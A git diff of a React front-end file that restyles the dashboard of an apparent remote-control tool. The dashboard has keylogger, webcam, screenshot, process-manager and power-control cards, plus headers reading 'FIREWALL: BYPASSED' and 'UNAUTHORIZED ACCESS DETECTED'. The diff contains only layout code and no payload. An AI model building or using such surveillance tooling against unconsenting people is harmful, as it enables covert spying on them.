@@ -1,128 +1,123 @@
-﻿import { Terminal, ShieldCheck, Activity, Wifi, WifiOff } from 'lucide-react';
+﻿import { Terminal, ShieldCheck, Activity, Lock, Cpu } from 'lucide-react';
 import PowerControls from './components/PowerControls';
 import ProcessManager from './components/ProcessManager';
 import ScreenshotCard from './components/ScreenshotCard';
 import KeyloggerCard from './components/KeyloggerCard';
-// SỬA LỖI 1: Bỏ dấu ngoặc nhọn { } vì AgentSelector export default
 import AgentSelector from './components/AgentSelector';
-import { useSocket } from './contexts/SocketContext';
 import WebcamCard from './components/WebcamCard';
+import { useSocket } from './contexts/SocketContext';
 
 function App() {
-    // SỬA LỖI 2: Chỉ lấy isConnected để dùng, bỏ isSystemLocked để tránh lỗi unused
-    const { isConnected, selectAgent } = useSocket();
+    const { isSystemLocked, isConnected, selectAgent } = useSocket();
 
     return (
-        <div className="min-h-screen bg-black bg-grid-pattern scan-line text-green-500 font-mono selection:bg-green-900 selection:text-white flex flex-col">
-
-            {/* --- HEADER --- */}
-            <header className="border-b border-green-500/30 bg-black/80 backdrop-blur-md sticky top-0 z-50 shadow-[0_5px_20px_rgba(0,0,0,0.5)]">
-                <div className="container mx-auto px-4 py-4 lg:px-6 lg:py-6">
-                    <div className="flex flex-col lg:flex-row items-center gap-6 lg:gap-10">
-                        {/* CỤM LOGO & TIÊU ĐỀ */}
-                        <div className="flex items-center gap-5">
-                            <div className={`p-4 border-2 rounded-lg bg-green-900/20 shadow-[0_0_15px_rgba(16,185,129,0.3)] transition-colors duration-500 ${isConnected ? 'border-green-500' : 'border-red-500'}`}>
-                                <Terminal className={`w-10 h-10 animate-pulse ${isConnected ? 'text-green-400' : 'text-red-500'}`} />
-                            </div>
-                            <div className="flex flex-col">
-                                <h1 className="text-4xl md:text-5xl font-black text-white text-shadow-neon tracking-tighter leading-none">
-                                    REMOTE<span className={isConnected ? "text-green-500" : "text-red-500"}>CONTROL</span>
-                                </h1>
-                                <div className="flex items-center gap-3 mt-2">
-                                    <span className={`text-[10px] px-2 py-0.5 rounded border font-bold ${isConnected ? 'bg-green-500/10 text-green-400 border-green-500/30' : 'bg-red-500/10 text-red-400 border-red-500/30'}`}>
-                                        v3.0-STABLE
-                                    </span>
-                                    {/* SỬA LỖI 3: Hiển thị trạng thái kết nối thực tế */}
-                                    <p className={`hidden sm:flex items-center gap-2 text-xs font-mono tracking-[0.3em] uppercase ${isConnected ? 'text-gray-500' : 'text-red-500 animate-pulse'}`}>
-                                        {isConnected ? (
-                                            <> <Wifi size={12} /> SECURE UPLINK ESTABLISHED </>
-                                        ) : (
-                                            <> <WifiOff size={12} /> CONNECTION LOST - RECONNECTING... </>
-                                        )}
-                                    </p>
-                                </div>
+        <div className="min-h-screen bg-cyber-grid text-gray-300 font-mono selection:bg-cyber-yellow selection:text-black flex flex-col scanlines overflow-hidden">
+            
+            {/* --- TOP HUD BAR --- */}
+            <header className="sticky top-0 z-50 bg-cyber-black/90 backdrop-blur border-b border-cyber-yellow/20 px-6 py-3 shadow-[0_5px_30px_rgba(0,0,0,0.8)]">
+                <div className="container mx-auto flex flex-col lg:flex-row items-center justify-between gap-4">
+                    
+                    {/* LOGO AREA */}
+                    <div className="flex items-center gap-4">
+                        <div className="relative group cursor-pointer">
+                            <div className="absolute inset-0 bg-cyber-yellow blur opacity-20 group-hover:opacity-40 transition-opacity"></div>
+                            <div className="relative border border-cyber-yellow p-2 bg-black clip-path-polygon">
+                                <Terminal className="w-8 h-8 text-cyber-yellow animate-pulse" />
                             </div>
                         </div>
-
-                        {/* AGENT SELECTOR */}
-                        <div className="w-full lg:flex-1">
-                            <div className="p-1.5 border border-green-500/30 rounded-xl bg-black/60 backdrop-blur shadow-inner w-full">
-                                <AgentSelector onSelectAgent={selectAgent} />
+                        <div>
+                            <h1 className="text-3xl font-display font-black text-white tracking-tighter leading-none glitch" data-text="NET_WATCH">
+                                NET_<span className="text-cyber-yellow">WATCH</span>
+                            </h1>
+                            <div className="flex items-center gap-2 text-[10px] text-cyber-blue font-mono tracking-widest">
+                                <span>V.2.77</span>
+                                <span className="w-1 h-1 bg-cyber-blue rounded-full"></span>
+                                <span>UNAUTHORIZED ACCESS DETECTED</span>
                             </div>
                         </div>
+                    </div>
+
+                    {/* STATUS INDICATORS */}
+                    <div className="flex items-center gap-6 font-mono text-xs">
+                         <div className="flex items-center gap-2 text-cyber-red">
+                             <ShieldCheck className="w-4 h-4" />
+                             <span className="hidden md:inline">FIREWALL: BYPASSED</span>
+                         </div>
+                         <div className="flex items-center gap-2 text-cyber-blue">
+                             <Activity className="w-4 h-4 animate-spin-slow" />
+                             <span>UPLINK: {isConnected ? "ESTABLISHED" : "SEARCHING..."}</span>
+                         </div>
                     </div>
                 </div>
             </header>
 
-            {/* --- MAIN CONTENT --- */}
-            <main className="container mx-auto px-6 py-8 flex-1 flex flex-col gap-6">
-
-                {/* Banner trạng thái */}
-                <div className="flex justify-between items-center p-3 bg-green-950/20 border-y border-green-500/30 text-sm text-green-400/80">
-                    <div className="flex items-center gap-2">
-                        <ShieldCheck size={16} />
-                        <span className="hidden sm:inline">SECURITY_LEVEL:</span>
-                        <span className="text-white font-bold">MAXIMUM</span>
-                    </div>
-                    <div className="flex items-center gap-2">
-                        <Activity size={16} className={isConnected ? "animate-spin" : ""} />
-                        <span className="hidden sm:inline">SYSTEM_MONITORING:</span>
-                        <span className={isConnected ? "text-green-300 font-bold" : "text-red-500 font-bold"}>
-                            {isConnected ? "ACTIVE" : "OFFLINE"}
-                        </span>
-                    </div>
+            {/* --- MAIN DASHBOARD --- */}
+            <main className="container mx-auto px-4 py-6 flex-1 flex flex-col gap-6 relative z-10">
+                
+                {/* Khu vực chọn Agent (Trên cùng) */}
+                <div className="w-full">
+                    <AgentSelector onSelectAgent={selectAgent} />
                 </div>
 
-                {/* HÀNG 1: Power & Keylogger */}
-                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
-                    <div className="glass-panel p-1 rounded-xl border border-green-500/20">
-                        <div className="bg-black/40 p-4 rounded-lg h-full">
+                {/* Dashboard Grid Layout */}
+                <div className="grid grid-cols-1 xl:grid-cols-12 gap-6 h-full">
+                    
+                    {/* CỘT TRÁI (3 phần) - Controls & Info */}
+                    <div className="xl:col-span-3 flex flex-col gap-6">
+                        <div className="flex-1 min-h-[300px]">
                             <PowerControls />
                         </div>
+                        <div className="bg-cyber-dark border border-cyber-blue/20 p-4 clip-path-polygon">
+                             <h4 className="text-cyber-blue text-xs mb-2 flex items-center gap-2">
+                                <Cpu size={14} /> SYSTEM RESOURCES
+                             </h4>
+                             {/* Fake Charts */}
+                             <div className="space-y-2">
+                                 <div className="h-1 w-full bg-gray-800 overflow-hidden"><div className="h-full bg-cyber-yellow w-[70%] animate-pulse"></div></div>
+                                 <div className="h-1 w-full bg-gray-800 overflow-hidden"><div className="h-full bg-cyber-blue w-[45%]"></div></div>
+                                 <div className="h-1 w-full bg-gray-800 overflow-hidden"><div className="h-full bg-cyber-red w-[20%]"></div></div>
+                             </div>
+                        </div>
                     </div>
 
-                    <div className="glass-panel p-1 rounded-xl border border-green-500/20">
-                        <div className="bg-black/40 p-4 rounded-lg h-full">
-                            <KeyloggerCard />
+                    {/* CỘT GIỮA (6 phần) - Visuals (Cam & Screen) */}
+                    <div className="xl:col-span-6 flex flex-col gap-6">
+                        <div className="h-[300px]">
+                             <ScreenshotCard />
                         </div>
+                        <div className="h-[300px]">
+                             <WebcamCard />
+                        </div>
+                    </div>
+
+                    {/* CỘT PHẢI (3 phần) - Logs & Process */}
+                    <div className="xl:col-span-3 flex flex-col gap-6">
+                         <div className="flex-1 min-h-[400px]">
+                             <KeyloggerCard />
+                         </div>
                     </div>
                 </div>
 
-                {/* HÀNG 2: Screenshot & Webcam */}
-                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
-                    <div className="glass-panel p-1 rounded-xl border border-green-500/20">
-                        <div className="bg-black/40 p-4 rounded-lg h-full">
-                            <ScreenshotCard />
-                        </div>
-                    </div>
-
-                    <div className="glass-panel p-1 rounded-xl border border-green-500/20">
-                        <div className="bg-black/40 p-4 rounded-lg h-full">
-                            <WebcamCard />
-                        </div>
-                    </div>
-                </div>
-
-                {/* HÀNG 3: Process Manager */}
-                <div className="glass-panel p-1 rounded-xl border border-green-500/20 mt-auto">
-                    <div className="bg-black/40 p-4 rounded-lg">
-                        <ProcessManager />
-                    </div>
+                {/* HÀNG DƯỚI CÙNG - Process Manager (Rộng toàn màn hình) */}
+                <div className="w-full mt-auto">
+                    <ProcessManager />
                 </div>
 
             </main>
 
-            {/* --- FOOTER --- */}
-            <footer className="border-t border-green-500/20 bg-black/90 py-4 mt-8">
-                <div className="container mx-auto px-6 flex flex-col md:flex-row justify-between items-center text-[10px] text-gray-600 font-mono tracking-widest">
-                    <div>
-                        SYSTEM_ID: <span className="text-green-700">CL-8821-X</span> | LATENCY: {isConnected ? "24ms" : "--"}
-                    </div>
-                    <div>
-                        {'// UNAUTHORIZED ACCESS IS PROHIBITED //'}
+            {/* --- SYSTEM LOCK OVERLAY --- */}
+            {isSystemLocked && (
+                <div className="fixed inset-0 z-[9999] bg-black/95 flex flex-col items-center justify-center">
+                    <div className="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-20"></div>
+                    <div className="relative border-2 border-cyber-red p-12 bg-black max-w-2xl w-full text-center shadow-[0_0_100px_rgba(255,0,60,0.5)] clip-path-polygon">
+                        <Lock className="w-32 h-32 text-cyber-red mx-auto mb-6 animate-pulse" />
+                        <h1 className="text-8xl font-display font-black text-cyber-red tracking-tighter mb-4 glitch">LOCKED</h1>
+                        <p className="text-white font-mono text-xl tracking-[0.5em] uppercase border-y border-cyber-red/50 py-4">
+                            Administrative Access Required
+                        </p>
                     </div>
                 </div>
-            </footer>
+            )}
         </div>
     );
 }
